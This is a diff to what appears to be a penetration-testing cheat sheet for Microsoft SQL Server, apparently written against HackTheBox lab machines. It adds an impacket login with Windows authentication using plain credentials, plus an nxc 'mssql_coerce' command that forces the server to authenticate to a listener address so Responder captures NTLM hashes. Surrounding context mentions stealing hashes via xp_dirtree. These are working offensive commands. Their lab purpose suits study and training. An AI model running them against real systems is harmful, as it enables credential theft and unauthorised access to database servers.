@@ -6,6 +6,12 @@
 mssqlclient.py admin:this_is_password@10.10.10.52 -db orcharddb -dc-ip 10.10.10.52
 ```
 
+if not working try with windows auth
+
+```bash
+mssqlclient.py -windows-auth manager.htb/operator:operator@manager.htb
+```
+
 ## Getting Hash by xp_dirtree
 
 ```
@@ -180,4 +186,12 @@ def main():
 if __name__ == "__main__":
     main()
 
+```
+
+## No Login
+
+if you can't access the mssql for some reason but u still have a user that can access the service then u can you use this to get a hit on responder.
+
+```bash
+nxc mssql manager.htb -u operator -p operator -M mssql_coerce -o LISTENER=10.10.11.236
 ```
